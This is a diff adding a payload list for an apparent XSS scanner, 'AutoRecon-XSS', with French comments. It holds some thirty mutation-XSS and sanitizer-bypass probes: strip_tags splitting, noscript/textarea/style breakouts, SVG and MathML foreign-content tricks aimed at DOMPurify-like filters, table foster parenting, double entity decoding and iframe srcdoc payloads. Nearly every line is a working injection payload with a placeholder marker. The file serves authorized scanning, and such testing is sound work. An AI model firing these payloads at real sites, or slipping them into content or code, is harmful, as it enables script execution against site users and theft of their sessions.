@@ -1,0 +1,52 @@
+# AutoRecon-XSS — sondes de MUTATION XSS / différentiel de parseur (reflected/stored).
+# Format : payload<TAB>contexts. PROBE = marqueur aléatoire.
+# Cible la classe "clean-on-save, dirty-on-render" : markup qui PASSE un sanitizer
+# mais que le navigateur (ou un filtre d'affichage : wptexturize, markdown, etc.)
+# ré-interprète en exécutable. Cf. CVE-2026-64638 (wp-login strip_tags vs sanitizer),
+# CVE-2026-93485 (filtre commentaires WP), CVE-2026-48849 (Roundcube draft).
+# Détection par écho : utile pour voir quel markup ressort ; la CONFIRMATION se fait
+# mieux via --dom-payloads payloads/mutation-dom.txt (le navigateur mute réellement).
+# Usage autorisé uniquement.
+
+# --- différentiel strip_tags / balises mal fermées (type wp-login) ---
+<scr<script>ipt>PROBE</scr</script>ipt>	html-body
+<img src=x onerror=PROBE //	html-body,tag
+<p<svg/onload=PROBE>	html-body
+<svg><p>PROBE	html-body
+<i>PROBE<img src=x onerror=PROBE>	html-body
+
+# --- noscript / rcdata / rawtext breakout ---
+<noscript><p title="</noscript><img src=x onerror=PROBE>">	html-body
+<textarea></textarea><img src=x onerror=PROBE>	html-body
+<title></title><img src=x onerror=PROBE>	html-body
+<xmp></xmp><img src=x onerror=PROBE>	html-body
+<style></style><img src=x onerror=PROBE>	html-body
+<listing></listing><img src=x onerror=PROBE>	html-body
+
+# --- foreign content (SVG / MathML) : mXSS moderne, contourne DOMPurify-like ---
+<svg><style><img src=x onerror=PROBE></style></svg>	html-body
+<svg></p><style><a id="</style><img src=x onerror=PROBE>">	html-body
+<math><mtext><table><mglyph><style><img src=x onerror=PROBE></style>	html-body
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=PROBE>	html-body
+<svg></svg><style>&lt;img src=x onerror=PROBE&gt;	html-body
+
+# --- foster parenting (table) ---
+<table><caption><svg></table><img src=x onerror=PROBE>	html-body
+<table><math><mtext><img src=x onerror=PROBE>	html-body
+
+# --- template / select / rawtext conteneurs ---
+<template><img src=x onerror=PROBE></template>	html-body
+<select><template><img src=x onerror=PROBE>	html-body
+
+# --- double décodage d'entités (filtre qui décode après coup) ---
+&lt;img src=x onerror=PROBE&gt;	html-body
+&#60;img src=x onerror=PROBE&#62;	html-body
+%3Cimg src=x onerror=PROBE%3E	html-body
+
+# --- iframe srcdoc (double décodage, classe bypass DOMPurify) ---
+<iframe srcdoc="&lt;img src=x onerror=PROBE&gt;">	html-body
+<iframe srcdoc="&amp;lt;img src=x onerror=PROBE&amp;gt;">	html-body
+
+# --- commentaire conditionnel / style comment ---
+<style><!--</style><img src=x onerror=PROBE>-->	html-body
+--><img src=x onerror=PROBE>	html-comment
